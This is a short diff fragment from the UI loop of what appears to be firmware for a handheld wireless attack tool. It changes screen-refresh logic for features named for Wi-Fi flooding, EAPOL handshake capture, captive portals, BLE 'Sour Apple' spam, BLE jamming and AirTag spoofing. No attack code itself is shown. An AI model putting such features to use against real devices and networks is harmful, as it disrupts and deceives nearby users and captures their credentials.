     case SCR_AIRTAG:      drawAirTagScreen(); break;
 
@@ -5111,7 +5446,10 @@ void UI::loop() {
     if (_screen == SCR_FLOOD && floodRunning && floodSent != lastFlood) { lastFlood = floodSent; need = true; }
     if (_screen == SCR_EAPOL && eapolRunning && eapolCount != (int)lastEapol) { lastEapol = eapolCount; need = true; }
     if (_screen == SCR_CAPTIVE) need = true;
-    if (_screen == SCR_SOUR_APPLE && sourRunning && sourSent != lastSour) { lastSour = sourSent; need = true; }
+    if ((_screen == SCR_SOUR_NOTIF && sourRunning && sourSent != lastSour) ||
+        (_screen == SCR_SOUR_DEVICES && sourDevRunning && sourDevSent != lastSour)) {
+      lastSour = sourRunning ? sourSent : sourDevSent; need = true;
+    }
     if (_screen == SCR_BLE_JAM && jamRunning && jamCount != lastJam) { lastJam = jamCount; need = true; }
     if (_screen == SCR_AIRTAG && (airDetRunning || airSpoofRunning)) need = true;
     // BLE scan / sniff: live pkt + device counters on TFT
